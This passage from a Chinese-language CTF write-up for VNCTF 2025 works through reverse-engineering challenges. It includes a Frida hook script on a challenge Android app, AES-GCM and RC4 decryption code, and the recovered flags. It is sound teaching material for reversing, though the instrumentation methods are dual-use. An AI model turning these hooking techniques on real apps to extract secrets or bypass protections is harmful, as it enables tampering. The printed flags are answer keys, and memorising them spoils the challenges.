class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">package_name = <span class="string">&quot;com.atri.ezcompose&quot;</span></span><br><span class="line"></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">        var JNI = Java.use(&#x27;com.atri.ezcompose.JNI&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var instance = JNI.INSTANCE.value;</span></span><br><span class="line"><span class="string">        console.log(&#x27;INSTANCE: &#x27; + instance);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        instance.getAt.implementation = function () &#123;</span></span><br><span class="line"><span class="string">            var result = this.getAt();</span></span><br><span class="line"><span class="string">            console.log(&quot;getAt result: &quot; + result);</span></span><br><span class="line"><span class="string">            return result;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Error: &quot; + e);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    session = device.attach(<span class="string">&quot;ezCompose&quot;</span>)</span><br><span class="line">    script = session.create_script(hook_script)</span><br><span class="line">    script.load()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSTANCE: com.atri.ezcompose.JNI@f264edc</span></span><br><span class="line"><span class="comment"># getAt result: mysecretadd</span></span><br></pre></td></tr></table></figure><p>拦截到ADD数据为”mysecretadd”</p><p>可以从主加密流程看到最后Base64是将IV加上被加密数据后在进行编码，所以将被加密的Flag进行Base64解码后去掉前面的”114514”就是原密文。</p><p>使用java进行解密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.GCMParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">IV</span> <span class="operator">=</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] Key = &#123;<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">101</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">97</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] AAdBytes = &#123;<span class="number">109</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">100</span>&#125;;</span><br><span class="line">        <span class="comment">// 原密文</span></span><br><span class="line">        <span class="type">int</span> [] Enc  = &#123;<span class="number">0x1c</span>,<span class="number">0xcb</span>,<span class="number">0x89</span>,<span class="number">0x28</span>,<span class="number">0xb3</span>,<span class="number">0x96</span>,<span class="number">0xd4</span>,<span class="number">0x1a</span>,<span class="number">0x82</span>,<span class="number">0x02</span>,<span class="number">0x2d</span>,<span class="number">0x8c</span>,<span class="number">0xc6</span>,<span class="number">0x91</span>,<span class="number">0xd8</span>,<span class="number">0x8c</span>,<span class="number">0x68</span>,<span class="number">0xe9</span>,<span class="number">0x3e</span>,<span class="number">0xaf</span>,<span class="number">0x36</span>,<span class="number">0x5d</span>,<span class="number">0x74</span>,<span class="number">0x3f</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0x79</span>,<span class="number">0x59</span>,<span class="number">0x8a</span>,<span class="number">0xd9</span>,<span class="number">0xd8</span>,<span class="number">0xc5</span>,<span class="number">0x79</span>,<span class="number">0xdd</span>,<span class="number">0xaf</span>,<span class="number">0x71</span>,<span class="number">0x8d</span>,<span class="number">0x05</span>,<span class="number">0x5b</span>,<span class="number">0x45</span>,<span class="number">0xa5</span>,<span class="number">0x5d</span>,<span class="number">0x46</span>,<span class="number">0x25</span>,<span class="number">0xc5</span>,<span class="number">0xad</span>,<span class="number">0x29</span>,<span class="number">0xfa</span>,<span class="number">0x11</span>,<span class="number">0xc4</span>,<span class="number">0x0f</span>,<span class="number">0xcc</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">GCMParameterSpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GCMParameterSpec</span>(<span class="number">128</span>, IV.getBytes());</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">keySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(Key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] aas = <span class="keyword">new</span> <span class="title class_">byte</span>[Enc.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Enc.length; i++) &#123;</span><br><span class="line">            aas[i] = (<span class="type">byte</span>) Enc[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES_128/GCM/NoPadding&quot;</span>);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE,keySpec,spec);</span><br><span class="line">        cipher.updateAAD(AAdBytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] Original = cipher.doFinal(aas);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Original, java.nio.charset.StandardCharsets.UTF_8);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// VNCTF&#123;Y0U_@re_th3_Ma5t3r_0f_C0mp0s3&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{Y0U_@re_th3_Ma5t3r_0f_C0mp0s3}</strong></p><h3 id="抽奖转盘"><a href="#抽奖转盘" class="headerlink" title="抽奖转盘"></a>抽奖转盘</h3><p>jadx分析hap文件中的modules.abc文件</p><p><img src="/2025/02/12/VNCTF2025/zp1.png" alt="e2917f062e0a2de095ca14ce3b6c365e"></p><p>在MyPage下发现一段字节数组。</p><p><img src="/2025/02/12/VNCTF2025/zp2.png" alt="QQ_1739080781927"><img src="/2025/02/12/VNCTF2025/zp6.png" alt="QQ_1739080763900"></p><p>获取到一个字符串存到lexenv_0_0中，进行了一次forEach对每个字节进行了加密计算。然后再调用函数对比那个字节数组与被加密的字符串，比较是否相等，这边应该就是最后的一次加密和对比。可以将这段字节数组进行逆向计算，可以得到一串明文。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123; <span class="number">101</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">87</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">69</span>, <span class="number">55</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">83</span>, <span class="number">62</span>, <span class="number">111</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">53</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">117</span>, <span class="number">93</span>, <span class="number">127</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">93</span>, <span class="number">115</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">44</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EncFlag[i] ^= <span class="number">7</span>;</span><br><span class="line">EncFlag[i] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.44s\n&quot;</span>, EncFlag);</span><br><span class="line">    <span class="comment">// aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出字符串像是Base64加密。</p><p>可以看到hap文件下有一个libhello.so。jadx全局搜索可以看到有调用libhello里面的MyCry函数，应该就是加密函数。</p><p><img src="/2025/02/12/VNCTF2025/zp3.png" alt="QQ_1739081075481"></p><p>使用IDA进行逆向分析libhello.so，通过字符串搜搜MyCry查找交叉引用找到Call。</p><p>可以看到以下流程很清晰，获取字符串，将字符串进行RC4加密（密钥为”Take_it_easy”），然后再进行Base64加密，这边判断了一个值是否等于40走不同分支。</p><p>RC4加密流程没被魔改，就最后将加密数据多异或了一个值，两个分支分别是异或上了40和24。尝试后发现40可以解密出明文。</p><p>将之前解密到的Base64字串进行decode然后RC4解密即可。</p><p><img src="/2025/02/12/VNCTF2025/zp4.png" alt="QQ_1739081335258"></p><p><img src="/2025/02/12/VNCTF2025/zp5.png" alt="QQ_1739081364253"></p><p>解密代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* s, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> k[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">s[i] = i;</span><br><span class="line">k[i] = key[i % Len_k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* Data, <span class="type">unsigned</span> <span class="type">long</span> Len_D, <span class="type">unsigned</span> <span class="type">char</span>* key, <span class="type">unsigned</span> <span class="type">long</span> Len_k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">rc4_init</span>(s, key, Len_k);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len_D; k++) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">Data[k] = Data[k] ^ s[t];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Cyberchef Base64 Decode(&quot;aLJ5aJqO/ApBpA/C9S8gUIsa1MSDBtijKDeqYwsziTYs&quot;)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;<span class="number">0x68</span>,<span class="number">0xB2</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x9A</span>,<span class="number">0x8E</span>,<span class="number">0xFC</span>,<span class="number">0x0A</span>,<span class="number">0x41</span>,<span class="number">0xA4</span>,<span class="number">0x0F</span>,<span class="number">0xC2</span>,<span class="number">0xF5</span>,<span class="number">0x2F</span>,<span class="number">0x20</span>,<span class="number">0x50</span>,<span class="number">0x8B</span>,<span class="number">0x1A</span>,<span class="number">0xD4</span>,<span class="number">0xC4</span>,<span class="number">0x83</span>,<span class="number">0x06</span>,<span class="number">0xD8</span>,<span class="number">0xA3</span>,<span class="number">0x28</span>,<span class="number">0x37</span>,<span class="number">0xAA</span>,<span class="number">0x63</span>,<span class="number">0x0B</span>,<span class="number">0x33</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x2C</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] ^= <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;Take_it_easy&quot;</span>;</span><br><span class="line"><span class="built_in">rc4_crypt</span>(EncFlag, <span class="number">33</span>, Key, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">EncFlag[i] -= <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.33s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line"><span class="comment">// VNCTF&#123;JUst_$ne_Iast_dance_2025!&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{JUst_$ne_Iast_dance_2025!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;VNCTF-2025-WP&quot;&gt;&lt;a href=&quot;#VNCTF-2025-WP&quot; class=&quot;headerlink&quot; title=&quot;VNCTF 2025 WP&quot;&gt;&lt;/a&gt;VNCTF 2025 WP&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot;</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
</feed>
